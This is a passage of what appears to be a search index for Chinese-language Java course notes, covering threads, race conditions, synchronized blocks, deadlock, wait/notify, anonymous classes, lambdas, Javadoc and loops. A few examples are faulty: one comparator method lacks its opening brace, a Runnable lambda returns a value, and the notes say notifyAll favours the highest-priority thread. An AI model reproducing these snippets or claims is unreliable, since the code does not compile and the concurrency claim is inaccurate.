<p>\u73b0\u4ee3\u8ba1\u7b97\u673a\u901a\u5e38\u6709\u5f88\u591a\u6838\u5fc3\uff0c\u6211\u4eec\u5c06\u5e0c\u671b\u7f16\u5199\u80fd\u591f\u5229\u7528\u6240\u6709\u8fd9\u4e9b\u6838\u5fc3\u7684\u4ee3\u7801\uff0c\u4ee5\u6700\u5927\u9650\u5ea6\u5730\u63d0\u9ad8\u6548\u7387\u3002Java\u652f\u6301\u591a\u7ebf\u7a0b\u4ee3\u7801 \u3002\u8fd9\u662f\u901a\u8fc7 <code>Thread</code> \u7c7b\u5b9e\u73b0\u7684 \u3002\u6bcf\u4e2a <code>Thread</code> \u7c7b\u7684\u5b9e\u4f8b\u4ee3\u8868\u4e00\u4e2a\u65b0\u7684\u6267\u884c\u7ebf\u7a0b \u3002\u5982\u679c\u6211\u4eec\u521b\u5efa\u591a\u4e2a\u7ebf\u7a0b\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8ba9\u4ee3\u7801\u7684\u591a\u4e2a\u90e8\u5206\u540c\u65f6\u6267\u884c \u3002\u901a\u5e38\uff0c\u6211\u4eec\u4f1a\u60f3\u8981\u6269\u5c55\u8fd9\u4e2a\u7c7b\u5e76\u91cd\u5199\u5176 <code>run()</code> \u65b9\u6cd5 \u3002</p> </li> </ul>"},{"location":"cs/java/basics/w10/#create-a-tread","title":"Create a Tread","text":""},{"location":"cs/java/basics/w10/#ex1","title":"Ex1","text":"<pre><code>class MyThread extends Thread {\n    private int number;\n\n    public MyThread(int number) {\n        this.number = number;\n    }\n\n    @Override\n    public void run() {\n        System.out.println(\"MyThread (\" + number + \") running\");\n    }\n}\n\npublic class ThreadExample {\n    public static void main(String[] args) {\n        for (int i = 0; i &lt; 10; i++) {\n            MyThread t = new MyThread(i);\n            t.start();\n        }\n    }\n}\n</code></pre> <p>\u5b9a\u4e49\u4e00\u4e2a\u7c7b\u7ee7\u627f Thread \u7136\u540e\u6784\u9020\u51fd\u6570\u521d\u59cb\u5316\uff0c\u91cd\u8f7d run \u51fd\u6570\uff0c\u5728 ThreadExample \u7c7b\u7684 main \u65b9\u6cd5\u4e2d\u521b\u5efa\u4e86\u4e00\u4e2a\u5faa\u73af\uff0c\u5faa\u73af\u5341\u6b21\u3002\u5728\u6bcf\u6b21\u5faa\u73af\u4e2d\uff0c\u4f1a\u521b\u5efa\u4e00\u4e2a <code>MyThread</code> \u7c7b\u7684\u5b9e\u4f8b <code>t</code>\uff0c\u5e76\u4f20\u5165\u5f53\u524d\u7684\u5faa\u73af\u53d8\u91cf <code>i</code> \u4f5c\u4e3a\u7ebf\u7a0b\u7f16\u53f7 \u3002\u7136\u540e\uff0c\u8c03\u7528 <code>t.start()</code> \u65b9\u6cd5 \u3002\u4e00\u65e6\u8c03\u7528 <code>start()</code> \u65b9\u6cd5\uff0c<code>run()</code> \u65b9\u6cd5\u4e2d\u7684\u4ee3\u7801\u5c31\u4f1a\u5728\u4e00\u4e2a\u65b0\u7684\u7ebf\u7a0b\u4e2d\u5e76\u53d1\u6267\u884c \u3002\u6ce8\u610f\uff1a\u56e0\u4e3a\u7ebf\u7a0b\u8c03\u5ea6\u7684\u4e0d\u786e\u5b9a\u6027 \uff0c\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u4f1a\u6ce8\u610f\u5230\u7ebf\u7a0b\u7684\u6267\u884c\u987a\u5e8f\u5e76\u975e\u4e25\u683c\u6309\u7167 0 \u5230 9 \u7684\u987a\u5e8f\u3002</p>"},{"location":"cs/java/basics/w10/#ex2","title":"Ex2","text":"<pre><code>class MyRunnable implements Runnable {\n    private int number;\n\n    public MyRunnable(int number) {\n        this.number = number;\n    }\n\n    @Override\n    public void run() {\n        System.out.println(\"MyThread (\" + number + \") running\");\n    }\n}\n\npublic class RunnableExample {\n    public static void main(String[] args) {\n        for (int i = 0; i &lt; 10; i++) {\n            Thread t = new Thread(new MyRunnable(i));\n            t.start();\n        }\n    }\n}\n</code></pre> <p><code>Runnable</code> \u63a5\u53e3\u4e5f\u53ef\u4ee5\u7528\u6765\u521b\u5efa\u7ebf\u7a0b\uff0c\u5b9a\u4e49\u540e\u4f7f\u7528\u6784\u9020\u51fd\u6570\u7528\u4e8e\u63a5\u53d7\u548c\u50a8\u5b58\u6574\u6570\uff0c\u91cd\u8f7d <code>run</code> \u65b9\u6cd5\u540e\u5728 <code>main</code> \u4e2d\u7528 <code>Thread</code> \u5176\u4e2d\u7684\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u53ef\u63a5\u6536 <code>Runnable</code>\u5bf9\u8c61\uff0c\u7136\u540e\u542f\u52a8\u3002\u4e00\u822c\u6765\u8bf4\u8fd9\u79cd\u65b9\u6cd5\u66f4\u53d7\u63a8\u8350\u56e0\u4e3a\u53ef\u4ee5\u591a\u91cd\u5b9e\u73b0\uff0c\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u4e0d\u652f\u6301\u591a\u91cd\u7ee7\u627f\u3002</p>"},{"location":"cs/java/basics/w10/#join","title":"Join","text":"<p>\u4e00\u65e6\u6211\u4eec\u542f\u52a8\u4e86\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u6709\u65f6\u9700\u8981\u7b49\u5f85\u5b83\u6267\u884c\u5b8c\u6bd5\u624d\u80fd\u7ee7\u7eed\u4e3b\u7a0b\u5e8f\u7684\u540e\u7eed\u6b65\u9aa4\uff0c\u7279\u522b\u662f\u5f53\u540e\u7eed\u6b65\u9aa4\u4f9d\u8d56\u4e8e\u8be5\u7ebf\u7a0b\u7684\u6267\u884c\u7ed3\u679c\u65f6 \u3002\u4f8b\u5982\uff0c\u5982\u679c\u4f60\u521b\u5efa\u4e86\u4e24\u4e2a\u7ebf\u7a0b\u5206\u522b\u4ece\u4e24\u4e2a\u4e0d\u540c\u7684\u6570\u636e\u5e93\u8bfb\u53d6\u6570\u636e\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u7b49\u5f85\u4e24\u4e2a\u7ebf\u7a0b\u90fd\u8fd4\u56de\u7ed3\u679c\u540e\u624d\u80fd\u7ee7\u7eed\u7a0b\u5e8f\u7684\u4e0b\u4e00\u6b65\u64cd\u4f5c \u3002</p> <ul> <li> <p>Java \u63d0\u4f9b\u4e86 <code>join()</code> \u65b9\u6cd5\uff1a\u4e00\u4e2a\u7ebf\u7a0b\u5b8c\u6210\u4e86 <code>run()</code> \u65b9\u6cd5\u6267\u884c\u540e\u8c03\u7528 <code>join()</code> \u5c31\u4f1a\u4f7f\u5f53\u524d\u7ebf\u7a0b\u7b49\u5f85\u76f4\u5230\u7ebf\u7a0b\u6267\u884c\u5b8c\u6bd5</p> <pre><code>public class JoinExample {\n    public static void main(String[] args) {\n        Thread[] threads = new Thread[10];\n        for (int i = 0; i &lt; 10; i++) {\n            threads[i] = new MyThread(i);\n            threads[i].start();\n        }\n\n        for (int i = 0; i &lt; 10; i++) {\n            try {\n                threads[i].join();\n            } catch (InterruptedException e) {}\n        }\n        System.out.println(\"All threads finished\");\n    }\n}\n</code></pre> <p>\u5341\u4e2a\u7ebf\u7a0b\u5168\u90e8\u6267\u884c\u5b8c\u6bd5\u540e\u624d\u4f1a\u88ab\u6253\u5370\u51fa\u6765\u3002<code>join()</code> \u65b9\u6cd5\u4f1a\u629b\u51fa\u4e00\u4e2a <code>InterruptedException</code> (\u68c0\u67e5\u578b\u5f02\u5e38) \u3002\u8fd9\u79cd\u60c5\u51b5\u4f1a\u5728\u4e00\u4e2a\u7ebf\u7a0b\u7684\u6267\u884c\u4ee5\u975e\u9884\u671f\u7684\u65b9\u5f0f\u7ed3\u675f\u65f6\u53d1\u751f </p> </li> </ul>"},{"location":"cs/java/basics/w10/#race-condition","title":"Race condition","text":"<p>Race Condition: \u5f53\u4e24\u4e2a\u6216\u591a\u4e2a\u7ebf\u7a0b\u8bd5\u56fe\u540c\u65f6\u5bf9\u5171\u4eab\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\uff0c\u5e76\u4e14\u64cd\u4f5c\u7684\u6267\u884c\u987a\u5e8f\u4f1a\u5f71\u54cd\u6700\u7ec8\u7ed3\u679c\u65f6\uff0c\u5c31\u53d1\u751f\u4e86\u7ade\u6001\u6761\u4ef6\u3002\u6bcf\u6b21\u8fd0\u884c\u7a0b\u5e8f\u7ed3\u679c\u90fd\u4e0d\u540c\u56e0\u6b64\u4e00\u4e0d\u5c0f\u5fc3\u5c31\u53d8\u6210\u4e86 bug\u3002</p>"},{"location":"cs/java/basics/w10/#ex1_1","title":"Ex1","text":"<pre><code>class SpecialInt {\n    private int value;\n\n    public SpecialInt(int value) {\n        this.value = value;\n    }\n\n    public int getValue() {\n        return value;\n    }\n\n    public void increment() {\n        value++;\n    }\n}\n</code></pre> <pre><code>class AddThread extends Thread {\n    private SpecialInt specialInt;\n\n    public AddThread(SpecialInt specialInt) {\n        this.specialInt = specialInt;\n    }\n\n    public void run() {\n        for (int i = 0; i &lt; 1000000; i++) {\n            specialInt.increment();\n        }\n    }\n}\n</code></pre> <pre><code>public class RaceCondition {\n    public static void main(String[] args) {\n        SpecialInt specialInt = new SpecialInt(0);\n        Thread t1 = new AddThread(specialInt);\n        Thread t2 = new AddThread(specialInt);\n\n        t1.start();\n        t2.start();\n\n        try {\n            t1.join();\n            t2.join();\n        } catch (InterruptedException e) {}\n\n        System.out.println(specialInt.getValue());\n    }\n}\n</code></pre> <p>\u8fd9\u4e2a\u7a0b\u5e8f\u4f1a\u5bfc\u81f4\u5927\u91cf\u7684\u7ade\u6001\u6761\u4ef6 \u3002\u5982\u679c\u4f60\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4f1a\u53d1\u73b0\u8f93\u51fa\u7ed3\u679c\u901a\u5e38\u4e0d\u662f2,000,000 \u3002\u8fd9\u662f\u56e0\u4e3a <code>specialInt.increment()</code> \u64cd\u4f5c\uff08\u5373 <code>value++</code>\uff09\u4e0d\u662f\u539f\u5b50\u6027\u7684\u3002\u5b83\u5b9e\u9645\u4e0a\u5305\u542b\u4e09\u4e2a\u6b65\u9aa4\uff1a\u8bfb\u53d6 <code>value</code> \u7684\u5f53\u524d\u503c\uff0c\u5c06\u8be5\u503c\u52a01\uff0c\u7136\u540e\u5c06\u65b0\u503c\u5199\u56de <code>value</code>\u3002\u591a\u4e2a\u7ebf\u7a0b\u7684\u8fd9\u4e09\u4e2a\u6b65\u9aa4\u53ef\u80fd\u4f1a\u4ea4\u9519\u6267\u884c\uff0c\u5bfc\u81f4\u67d0\u4e9b\u589e\u52a0\u64cd\u4f5c\u4e22\u5931\u3002</p> <ul> <li>Good: Thread A reads 0, A writes 1, B reads 1, B writes 2</li> </ul> <ul> <li>Bad: Thread A reads 0, B reads 0, A writes 1, B writes 1</li> </ul>"},{"location":"cs/java/basics/w10/#synchronized","title":"Synchronized","text":"<pre><code>synchronized (object) {\n    // ... code ...\n}\n</code></pre> <p>Java \u63d0\u4f9b\u540c\u6b65\u8bed\u53e5\uff0c\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u8fdb\u5165\u8fd9\u4e2a\u4ee3\u7801\u5757\u65f6\uff0c\u5b83\u4f1a\u5c1d\u8bd5\u83b7\u53d6 <code>object</code> \u5bf9\u8c61\u4e0a\u7684\u9501\u3002</p> <ul> <li>\u5982\u679c\u8be5\u5bf9\u8c61\u5df2\u7ecf\u88ab\u5176\u4ed6\u7ebf\u7a0b\u9501\u5b9a\uff0c\u90a3\u4e48\u5f53\u524d\u7ebf\u7a0b\u5c06\u4f1a\u7b49\u5f85\uff0c\u76f4\u5230\u8be5\u5bf9\u8c61\u88ab\u91ca\u653e</li> <li>\u7ebf\u7a0b\u9501\u5b9a\u5bf9\u8c61\u3001\u6267\u884c\u4ee3\u7801\u5757\u4ee3\u7801\u3001\u88ab\u89e3\u9501</li> </ul> <p>\u8be5\u5b57\u6bb5\u6709\u6548\u907f\u514d\u4e86\u7ade\u6001</p> <pre><code>class AddThread extends Thread {\n    private SpecialInt specialInt;\n\n    public AddThread(SpecialInt specialInt) {\n        this.specialInt = specialInt;\n    }\n\n    public void run() {\n        for (int i = 0; i &lt; 1000000; i++) {\n            synchronized (specialInt) {\n                specialInt.increment();\n            }\n        }\n    }\n}\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u4e2a\u65b9\u6cd5\u662f\u5728\u8c03\u7528\u671f\u95f4\u7ed9 <code>object</code> \u4e34\u65f6\u8bbe\u7f6e\u540c\u6b65\uff0c\u76f4\u63a5\u5728\u539f\u7c7b\u76f4\u63a5\u8bbe\u7f6e method \u4e3a\u540c\u6b65\u4e00\u6837\u6709\u6548</p> <pre><code>class SpecialInt {\n    private int value;\n\n    public SpecialInt(int value) {\n        this.value = value;\n    }\n\n    public int getValue() {\n        return value; //\n    }\n\n    public synchronized void increment() { //\n        value++;\n    }\n}\n</code></pre> <p>\u4e24\u8005\u540c\u6837\u5b89\u5168\u6709\u6548</p>"},{"location":"cs/java/basics/w10/#deadlock","title":"Deadlock","text":"<p>\u7531\u4e8e Java \u7684\u540c\u6b65\u5173\u952e\u5b57\u53ea\u9488\u5bf9\u5355\u4e2a\u5bf9\u8c61\uff1a\u7ebf\u7a0b A \u6301\u6709\u5bf9\u8c61 1 \u7684\u9501\uff0c\u60f3\u8981\u83b7\u53d6\u5bf9\u8c61 2 \u7684\u9501\uff1b\u540c\u65f6 B \u6301\u6709\u5bf9\u8c61 2 \u7684\u9501\u5e76\u4e14\u60f3\u8981\u83b7\u53d6\u5bf9\u8c61 1 \u7684\u9501\u3002\u8fd9\u79cd\u60c5\u51b5\u4f1a\u6c38\u8fdc\u7b49\u5f85\u4e0b\u53bb\u5bfc\u81f4\u6b7b\u9501\uff0c\u5c31\u50cf\u4e24\u4e2a\u793c\u8c8c\u7684\u4eba\u6c38\u8fdc\u4e92\u76f8\u8c26\u8ba9\u3002</p> <pre><code>synchronized (specialInt1) { // \u5148\u83b7\u53d6 specialInt1 \u7684\u9501\n    // ...\n    synchronized (specialInt2) { // \u518d\u83b7\u53d6 specialInt2 \u7684\u9501\n        // ... \u5bf9\u4e24\u8005\u8fdb\u884c\u64cd\u4f5c ...\n    }\n}\n</code></pre> <p>\u56e0\u6b64\u5982\u679c\u5728\u6267\u884c\u7684\u65f6\u5019\u5b9e\u73b0\u5b89\u5168\u9501\uff0c\u53ea\u80fd\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u9010\u4e2a\u83b7\u53d6\u9501</p> <pre><code>Thread t1 = new AddBothThread(specialInt1, specialInt2); //\nThread t2 = new AddBothThread(specialInt2, specialInt1); // \u6ce8\u610f\u53c2\u6570\u987a\u5e8f\n\nt1.start();\nt2.start();\n</code></pre> <p>\u7531\u4e8e\u4f20\u9012\u53c2\u6570\u987a\u5e8f\u7684\u4e0d\u540c\u5bfc\u81f4\u4e86\u6b7b\u9501\uff1a\u7ebf\u7a0b t1 \u7b49\u5f85 t2 \u91ca\u653e\uff0c\u7ebf\u7a0b t2 \u7b49\u5f85 t1 \u91ca\u653e\u3002\u8fd9\u79cd\u60c5\u51b5\u4f1a\u6c38\u8fdc\u7b49\u5f85\u4e0b\u53bb\u5bfc\u81f4\u6b7b\u9501\uff0c\u5c31\u50cf\u4e24\u4e2a\u793c\u8c8c\u7684\u4eba\u6c38\u8fdc\u4e92\u76f8\u8c26\u8ba9\u3002\u4fee\u590d\u65b9\u6cd5\u5c31\u662f t2 \u4f20\u53c2\u987a\u5e8f\u6539\u4e3a\u4e0e t1 \u4e00\u81f4\u3002</p>"},{"location":"cs/java/basics/w10/#inter-thread-communication","title":"Inter-thread communication","text":"<p>\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u5b83\u9700\u8981\u7b49\u5f85\u67d0\u4e2a\u5bf9\u8c61\u88ab\u66f4\u65b0\u540e\u624d\u80fd\u7ee7\u7eed\u6267\u884c \u3002\u8fd9\u4e2a\u7ebf\u7a0b\u9700\u8981\u91ca\u653e\u5b83\u6301\u6709\u7684\u9501\uff0c\u4ee5\u4fbf\u5176\u4ed6\u7ebf\u7a0b\u53ef\u4ee5\u66f4\u65b0\u8be5\u5bf9\u8c61 \u3002</p>"},{"location":"cs/java/basics/w10/#wait","title":"<code>wait()</code>","text":"<ul> <li><code>wait()</code> \u65b9\u6cd5\u7528\u4e8e\u5c06\u5f53\u524d\u7ebf\u7a0b\u7f6e\u4e8e\u201c\u7b49\u5f85\u201d\u72b6\u6001 \u3002</li> <li>\u5176\u5fc5\u987b\u5728 <code>synchronized</code> \u4ee3\u7801\u5757\u6216\u540c\u6b65\u65b9\u6cd5\u5185\u90e8</li> <li>\u4e00\u65e6\u8c03\u7528\u4e86 <code>wait()</code>\uff0c\u7ebf\u7a0b\u4f1a\u91ca\u653e\u5b83\u5728\u8be5\u5bf9\u8c61\u4e0a\u6301\u6709\u7684\u9501\uff0c\u5e76\u8fdb\u5165\u7b49\u5f85\u72b6\u6001\uff0c\u76f4\u5230\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u5728\u8be5\u5bf9\u8c61\u4e0a\u8c03\u7528 <code>notify()</code> \u3002</li> </ul>"},{"location":"cs/java/basics/w10/#notify-and-notifyall","title":"<code>notify() and notifyAll()</code>","text":"<ul> <li><code>notify()</code>: \u5524\u9192\u5355\u4e2a\u6b63\u5728\u7b49\u5f85\u8be5\u5bf9\u8c61\u9501\u7684\u7ebf\u7a0b \u3002\u5982\u679c\u6709\u591a\u4e2a\u7ebf\u7a0b\u5728\u7b49\u5f85\uff0c\u4f1a\u4efb\u610f\u9009\u62e9\u4e00\u4e2a\u8fdb\u884c\u5524\u9192\u3002</li> <li><code>notifyAll()</code>: \u5524\u9192\u6240\u6709\u6b63\u5728\u7b49\u5f85\u8be5\u5bf9\u8c61\u9501\u7684\u7ebf\u7a0b \u3002\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u7ebf\u7a0b\u4f1a\u9996\u5148\u83b7\u5f97\u9501 \u3002</li> <li>\u540c\u6837\u4e5f\u5fc5\u987b\u5728\u540c\u6b65\u4e0a\u4e0b\u6587\u4e2d\u8c03\u7528</li> </ul>"},{"location":"cs/java/basics/w10/#produceconsume","title":"ProduceConsume","text":"<p>\u8fd9\u4e2a\u4f8b\u5b50\u6f14\u793a\u4e86\u751f\u4ea7\u8005\u6d88\u8d39\u8005\u6a21\u5f0f\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u751f\u6210\u6570\u636e\uff0c\u53e6\u5916\u4e00\u4e2a\u6d88\u8d39\u6570\u636e</p> <pre><code>class ProduceConsume {\n    private String sharedResource; // \u5171\u4eab\u8d44\u6e90\n\n    // \u751f\u4ea7\u8005\u65b9\u6cd5\n    public synchronized void produce(String value) throws InterruptedException { //\n        while (sharedResource != null) {\n            // \u7b49\u5f85\u6d88\u8d39\u8005\u6d88\u8d39\u8d44\u6e90\n            wait();\n        }\n        sharedResource = value;\n        System.out.println(\"Produced: \" + value);\n        // \u901a\u77e5\u6d88\u8d39\u8005\u8d44\u6e90\u5df2\u51c6\u5907\u597d\n        notify();\n    }\n\n    // \u6d88\u8d39\u8005\u65b9\u6cd5\n    public synchronized void consume() throws InterruptedException {\n        while (sharedResource == null) {\n            // \u7b49\u5f85\u751f\u4ea7\u8005\u751f\u4ea7\u8d44\u6e90\n            wait();\n        }\n        System.out.println(\"Consumed: \" + sharedResource);\n        sharedResource = null;\n        // \u901a\u77e5\u751f\u4ea7\u8005\u8d44\u6e90\u5df2\u88ab\u6d88\u8d39\n        notify();\n    }\n}\n</code></pre> <p>\u90a3\u4e48\u8fd9\u6837\u4e00\u6765\u7ebf\u7a0b\u5728\u8c03\u7528\u8fd9\u7c7b\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u5728\u4e0d\u540c\u7c7b\u91cc\u751f\u4ea7\u5341\u6b21\u548c\u6d88\u8d39\u5341\u6b21\uff0c\u8c03\u7528\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u786e\u4fdd\u7ebf\u7a0b\u540c\u6b65\u7684\u540c\u65f6\u6570\u636e\u662f\u6b63\u786e\u88ab\u6d88\u8d39\uff0c\u6709\u4e86\u751f\u4ea7\u624d\u6709\u6d88\u8d39\u3002</p>"},{"location":"cs/java/basics/w10/#anonymous-class","title":"Anonymous Class","text":"<pre><code>class MyStringComparator implements Comparator&lt;String&gt; {\n    private static int countOccurences (String s, char c)\n        int count = 0;\n        for (int i = 0; i &lt; s.length(); i++) {\n            if (s.charAt(i) == c) {\n                count++;\n            }\n        }\n        return count;\n    }\n\n    @Override\n    public int compare (String s1, String s2) { \n        return countOccurences (s1, 'e') - countOccurences (s2, 'e'); \n    }\n}\n</code></pre> <pre><code>public class Sorting {\n    public static void main(String[] args) {\n        String[] strings = {\"elevated\", \"banana\", \"elephant\", \"early\"}; \n        Arrays.sort(strings, new MyStringComparator());\n        System.out.println(Arrays.toString(strings));\n    }\n}\n</code></pre> <p>\u6709\u65f6\u5019\u4f60\u53ea\u9700\u8981\u4e00\u4e2a\u4e00\u6b21\u6027\u7684\u5bf9\u8c61\uff0c\u533f\u540d\u7c7b\u5141\u8bb8\u5728\u4e0d\u663e\u5f0f\u58f0\u660e\u4e00\u4e2a\u65b0\u7c7b\u7684\u60c5\u51b5\u4e0b\u521b\u5efa\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5bf9\u8c61 \u3002\u8fd9\u5728\u5b8c\u6574\u7c7b\u5b9a\u4e49\u4f1a\u663e\u5f97\u7e41\u7410\u7684\u60c5\u51b5\u4e0b\u7279\u522b\u6709\u7528\u3002<code>Arrays.sort(array, comparator)</code> \u65b9\u6cd5\u4f7f\u7528 <code>Comparator&lt;T&gt;</code> \u7684\u5b9e\u4f8b\u6765\u5bf9\u6570\u7ec4\u8fdb\u884c\u6392\u5e8f \u3002\u8fd9\u4e2a\u63a5\u53e3\u53ea\u6709\u4e00\u4e2a\u9700\u8981\u5b9e\u73b0\u7684\u65b9\u6cd5\uff0c\u5373 <code>compare(a, b)</code> \u3002\u53ea\u662f\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u770b\u5230\u5c31\u8981\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 <code>MyStringComparator</code>\u3002</p> <pre><code>public class AnonymousSorting {\n    private static int countOccurences (String s, char c) { \n        int count = 0;\n        for (int i = 0; i &lt; s.length(); i++) { \n            if (s.charAt(i) == c) count++; \n        }\n        return count; \n    }\n\n    public static void main(String[] args) {\n        String[] strings = {\"elevated\", \"banana\", \"elephant\", \"early\"}; \n        Arrays.sort(strings, new Comparator&lt;String&gt;() { \n            public int compare (String s1, String s2) { \n                return countOccurences (s1, 'e') - countOccurences (s2, 'e'); \n            }\n        }); \n        System.out.println(Arrays.toString(strings)); \n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u8bed\u6cd5\u662f\u4ee5\u4e0b\u8fd9\u6837\u975e\u5e38\u7b80\u6d01\uff0c\u751a\u81f3\u53ef\u4ee5 extends a class</p> <pre><code>new ExistingClassOrInterface (arg1, arg2) {\n    // override methods here\n    // you can add fields too\n}\n</code></pre>"},{"location":"cs/java/basics/w10/#lambda-expression","title":"Lambda Expression","text":"<p>\u672c\u8d28\u4e0a\u662f\u533f\u540d\u65b9\u6cd5\u6216\u51fd\u6570\uff0c\u73b0\u5728\u72b9\u8c6b\u5176\u66f4\u65b9\u4fbf\uff0c\u7ecf\u5e38\u53d6\u4ee3\u533f\u540d\u7c7b</p> <pre><code>(parameter) -&gt; expression\n(param1, param2) -&gt; expression\n</code></pre> <pre><code>Comparator&lt;String&gt; comp = (s1, s2) -&gt; s1.length() - s2.length();\n</code></pre> <p>\u76f4\u63a5\u521b\u5efa\u4e00\u4e2a <code>Comparator</code> \u6765\u6839\u636e\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u7701\u7565\u7c7b\u578b\u8ba9\u5176\u81ea\u52a8\u63a8\u65ad</p> <pre><code>public class LambdaSorting {\n    private static int countOccurences (String s, char c) { \n        int count = 0; \n        for (int i = 0; i &lt; s.length(); i++) { \n            if (s.charAt(i) == c) count++; \n        }\n        return count; \n    }\n\n    public static void main(String[] args) {\n        String[] strings = {\"elevated\", \"banana\", \"elephant\", \"early\"}; \n        Arrays.sort(strings, (s1, s2) -&gt; countOccurences(s1, 'e') - countOccurences(s2, 'e')); \n        System.out.println(Arrays.toString(strings)); \n    }\n}\n</code></pre> <p>\u56e0\u6b64\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u6bd4\u8f83\u7248\u672c\u7684\u8fc7\u8f7d\u662f\u6700\u7b80\u5355\u7684\u975e\u5e38\u7d27\u51d1\uff0c\u65b9\u6cd5\u91cc\u7684\u53c2\u6570\u751a\u81f3\u4e0d\u7528\u5199\u7c7b\u578b\u81ea\u52a8\u63a8\u65ad</p>"},{"location":"cs/java/basics/w10/#details","title":"Details","text":"<p>\u53ef\u4ee5\u4e0d\u63a5\u53d7\u53c2\u6570\u3001\u591a\u4e2a expressions\uff0c\u4f46\u662f\u5982\u679c\u662f\u591a\u4e2a\u53c2\u6570\u4e2d\u7684 expressions \u6709 return \u8bed\u53e5\u5fc5\u987b\u663e\u793a</p> <pre><code>public class LambdaRunnable {\n    public static void main(String[] args) {\n        Runnable r = () -&gt; {\n            System.out.println(\"Hello, world!\"); \n            return 1;\n        }; \n        r.run(); \n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w10/#javadoc","title":"Javadoc","text":"<p>Javadoc \u662f\u4e00\u4e2a\u53ef\u4ee5\u4ece Java \u6e90\u4ee3\u7801\u76f4\u63a5\u81ea\u52a8\u751f\u6210 HTML \u683c\u5f0f API \u6587\u6863\u7684\u5de5\u5177 \u3002\u4f60\u9700\u8981\u5c06 Javadoc \u6ce8\u91ca\u653e\u5728\u7c7b\u3001\u5b57\u6bb5\u548c\u65b9\u6cd5\u58f0\u660e\u7684\u6b63\u524d\u65b9\uff0c\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>/**\n * \u8fd9\u662f\u4e00\u4e2a Javadoc \u6ce8\u91ca\u3002\n * \u5b83\u63cf\u8ff0\u4e86\u5b83\u524d\u9762\u7684\u7c7b\u3001\u65b9\u6cd5\u6216\u5b57\u6bb5\u3002\n */\n</code></pre> <p>\u5176\u6ce8\u91ca\u53ef\u4ee5\u5305\u542b\u6807\u7b7e (tags) \u4ee5\u63d0\u4f9b\u5173\u4e8e\u4ee3\u7801\u66f4\u5177\u4f53\u7684\u4fe1\u606f\uff0c\u4e0b\u8ff0\u4e3a method \u7248\u672c\u6ce8\u91ca</p> <pre><code>/**\n * \u8fd9\u4e2a\u65b9\u6cd5\u505a\u67d0\u4e8b\u3002 \n *\n * @param param \u53c2\u6570\u7684\u63cf\u8ff0 \n * @return \u8fd4\u56de\u503c\u7684\u63cf\u8ff0 \n * @throws ExceptionType \u4f55\u65f6\u4f1a\u629b\u51fa\u8be5\u5f02\u5e38 \n */\npublic ReturnType methodName (Type param) throws ExceptionType {\n    // \u65b9\u6cd5\u4f53\n}\n</code></pre> <p>\u8fd9\u4e2a\u7248\u672c\u662f\u7c7b\u7684\uff1a</p> <pre><code>/**\n * \u8fd9\u662f\u4e00\u4e2a\u7c7b\u4e0a\u7684 Javadoc \u6ce8\u91ca\u793a\u4f8b\u3002 \n */\npublic class Javadoc {\n\n    /**\n     * \u5982\u679c\u7ed9\u5b9a\u7684\u6574\u6570\u662f\u5076\u6570\uff0c\u6b64\u65b9\u6cd5\u8fd4\u56de true\uff0c\u5426\u5219\u8fd4\u56de false\u3002 \n     * @param x \u8981\u68c0\u67e5\u7684\u6574\u6570 \n     * @return \u5982\u679c x \u662f\u5076\u6570\u5219\u8fd4\u56de true\uff0c\u5426\u5219\u8fd4\u56de false \n     */\n    public boolean isEven (int x) {\n        return x % 2 == 0; // \n    }\n}\n</code></pre> <p>\u8981\u4ece Java \u6587\u4ef6\u4e2d\u76f4\u63a5\u751f\u6210 HTML \u6587\u6863\uff0c\u5b98\u65b9\u6587\u6863\u5c31\u662f\u5982\u6b64\u751f\u6210\uff1a</p> <pre><code>javadoc Javadoc.java -d mydocs \n</code></pre> <p><code>mydocs</code> \u662f\u6587\u4ef6\u5939\u540d</p>"},{"location":"cs/java/basics/w4/","title":"4.0 Loop","text":""},{"location":"cs/java/basics/w4/#switch","title":"Switch","text":"<pre><code>import java.util.Scanner;\n\npublic class Switch {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter a number: \");\n        int num = scanner.nextInt();\n        switch (num) {\n            case 1:\n                System.out.println(\"One\");\n                break;\n            case 2:\n                System.out.println(\"Two\");\n                break;\n            case 3:\n                System.out.println(\"Three\");\n                break;\n            default:\n                System.out.println(\"Other\");\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w4/#while","title":"While","text":"<pre><code>import java.util.Scanner;\n\npublic class Break {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        while (true) {\n            System.out.print(\"Are you ready for this program to end? Enter true or false: \");\n            boolean answer = scanner.nextBoolean();\n            if (answer)\n                break;\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w4/#do-while-loops","title":"Do-while loops","text":"<pre><code>import java.util.Scanner;\n\npublic class DoWhile {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        boolean answer; // Note that this variable is declared outside the loop.\n        do {\n            System.out.print(\"Are you ready for this program to end? Enter true or false: \");\n            answer = scanner.nextBoolean();\n        } while (!answer);\n    